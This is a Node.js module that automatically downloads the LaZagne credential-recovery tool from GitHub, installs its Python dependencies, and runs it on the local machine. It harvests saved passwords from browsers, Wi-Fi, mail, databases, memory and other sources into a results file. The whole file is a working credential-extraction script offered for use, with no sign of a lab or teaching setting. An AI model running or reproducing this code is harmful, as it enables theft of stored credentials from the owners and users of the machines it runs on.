const { spawnSync } = require("child_process");
const fs = require("fs");
const path = require("path");
const os = require("os");

function safeRun(cmdArr, opts = {}) {
    if (!Array.isArray(cmdArr) || cmdArr.length === 0) {
        return { rc: -1, stdout: "", stderr: "Invalid command" };
    }
    
    try {
        const proc = spawnSync(cmdArr[0], cmdArr.slice(1), {
            encoding: "utf8",
            timeout: opts.timeout || 60000,
            maxBuffer: 50 * 1024 * 1024,
            stdio: opts.silent ? 'pipe' : 'inherit'
        });
        return {
            rc: proc.status === null ? -1 : proc.status,
            stdout: (proc.stdout || "").trim(),
            stderr: (proc.stderr || "").trim()
        };
    } catch (e) {
        return { rc: -1, stdout: "", stderr: String(e) };
    }
}

function exists(p) {
    try {
        return fs.existsSync(path.normalize(p));
    } catch (e) {
        return false;
    }
}

function ensureDirectoryExists(dirPath) {
    if (!exists(dirPath)) {
        try {
            fs.mkdirSync(dirPath, { recursive: true, mode: 0o700 });
            return true;
        } catch (e) {
            return false;
        }
    }
    return true;
}

function checkPrerequisites() {
    const checks = {
        git: safeRun(["which", "git"], { silent: true }).rc === 0,
        python3: safeRun(["which", "python3"], { silent: true }).rc === 0,
        pip: safeRun(["which", "pip"], { silent: true }).rc === 0 || safeRun(["which", "pip3"], { silent: true }).rc === 0
    };
    
    return checks;
}

function installLaZagne(installPath) {
    const defaultPath = path.join(process.env.HOME || "/tmp", "tools");
    const targetDir = installPath || defaultPath;
    const laZagneDir = path.join(targetDir, "LaZagne");
    
    console.log("🔧 Installing LaZagne...");
    
    const prereqs = checkPrerequisites();
    const missing = Object.entries(prereqs).filter(([_, available]) => !available).map(([tool]) => tool);
    if (missing.length > 0) {
        throw new Error(`Missing prerequisites: ${missing.join(', ')}`);
    }
    
    if (!ensureDirectoryExists(targetDir)) {
        throw new Error("Failed to create target directory");
    }
    
    if (exists(laZagneDir)) {
        console.log("📁 LaZagne already exists, updating...");
        try {
            fs.rmSync(laZagneDir, { recursive: true, force: true });
        } catch (e) {
            throw new Error("Failed to remove existing directory");
        }
    }
    
    console.log("📥 Cloning repository...");
    process.chdir(targetDir);
    
    const cloneResult = safeRun([
        "git", "clone", 
        "https://github.com/AlessandroZ/LaZagne.git"
    ], { timeout: 120000 });
    
    if (cloneResult.rc !== 0) {
        throw new Error("Git clone failed");
    }
    
    const requirementsPath = path.join(laZagneDir, "requirements.txt");
    if (exists(requirementsPath)) {
        console.log("📦 Installing dependencies...");
        process.chdir(laZagneDir);
        
        const pipCmd = prereqs.pip && safeRun(["which", "pip"], { silent: true }).rc === 0 ? "pip" : "pip3";
        const installResult = safeRun([
            pipCmd, "install", "-r", "requirements.txt"
        ], { timeout: 180000 });
        
        if (installResult.rc !== 0) {
            console.log("⚠️ Some dependencies failed to install, continuing...");
        }
    }
    
    console.log("✅ LaZagne installation completed");
    return laZagneDir;
}

function findLaZagne() {
    const searchPaths = [
        path.join(process.env.HOME || "/tmp", "tools", "LaZagne"),
        path.join("/tmp", "tools", "LaZagne"),
        path.join("/opt", "LaZagne"),
        path.join(process.cwd(), "LaZagne")
    ];
    
    const platform = os.platform();
    let scriptName;
    
    switch (platform) {
        case 'darwin':
            scriptName = path.join("Mac", "laZagne.py");
            break;
        case 'linux':
            scriptName = path.join("Linux", "laZagne.py");
            break;
        case 'win32':
            scriptName = "Windows/laZagne.exe";
            break;
        default:
            scriptName = path.join("Linux", "laZagne.py");
    }
    
    for (const searchPath of searchPaths) {
        const fullPath = path.join(searchPath, scriptName);
        if (exists(fullPath)) {
            return { found: true, path: fullPath, dir: searchPath };
        }
    }
    
    return { found: false, path: null, dir: null };
}

function sanitizeOption(input) {
    const validOptions = ["all", "browsers", "chats", "databases", "games", "git", "mail", "memory", "multimedia", "php", "svn", "sysadmin", "unused", "wifi", "windows"];
    return validOptions.includes(input) ? input : "all";
}

module.exports = function(options) {
    const targetOption = sanitizeOption(options || "all");
    const outputDir = path.join(process.env.HOME || "/tmp", "lazagne_results");
    const timestamp = Date.now();
    const outputFile = path.join(outputDir, `lazagne_${timestamp}.txt`);
    
    console.log("🔍 Starting LaZagne credential extraction...");
    
    let lazagne = findLaZagne();
    
    if (!lazagne.found) {
        console.log("📦 LaZagne not found, installing...");
        try {
            const installDir = installLaZagne();
            lazagne = findLaZagne();
            
            if (!lazagne.found) {
                return "Failed: Installation completed but LaZagne not found";
            }
        } catch (error) {
            console.error(`❌ Installation failed: ${error.message}`);
            return `Failed: ${error.message}`;
        }
    }
    
    if (!ensureDirectoryExists(outputDir)) {
        return "Failed: Output directory creation error";
    }
    
    console.log(`🎯 Running LaZagne with option: ${targetOption}`);
    
    const originalDir = process.cwd();
    process.chdir(path.dirname(lazagne.path));
    
    const args = [path.basename(lazagne.path), targetOption, "-oN", outputFile];
    const platform = os.platform();
    
    let runCommand;
    if (platform === 'win32' && lazagne.path.endsWith('.exe')) {
        runCommand = args;
    } else {
        runCommand = ["python3", ...args];
    }
    
    console.log("🚀 Executing LaZagne...");
    
    const result = safeRun(runCommand, { timeout: 300000 });
    
    process.chdir(originalDir);
    
    if (result.rc === 0) {
        console.log("✅ LaZagne execution completed successfully");
    } else {
        console.log("⚠️ LaZagne completed with warnings");
    }
    
    if (exists(outputFile)) {
        try {
            const stats = fs.statSync(outputFile);
            fs.chmodSync(outputFile, 0o600);
            
            console.log(`📊 Results file size: ${stats.size} bytes`);
            
            const content = fs.readFileSync(outputFile, "utf8");
            const lines = content.split("\n").length;
            console.log(`📋 Results file contains ${lines} lines`);
            
            if (content.includes("[+]")) {
                console.log("🎉 Credentials found! Check the output file");
            } else {
                console.log("ℹ️ No credentials found");
            }
            
        } catch (e) {
            console.log("⚠️ Could not analyze results file");
        }
    } else {
        console.log("⚠️ Output file was not created");
    }
    
    console.log("\n📋 Summary:");
    console.log(`  Option used: ${targetOption}`);
    console.log(`  Output file: ${outputFile}`);
    console.log(`  Exit code: ${result.rc}`);
    
    console.log("\n🔒 Security Note:");
    console.log("  Results contain sensitive data - handle securely");
    console.log("  File permissions set to 600 (owner read/write only)");
    
    return `LaZagne completed. Results: ${outputFile}`;
};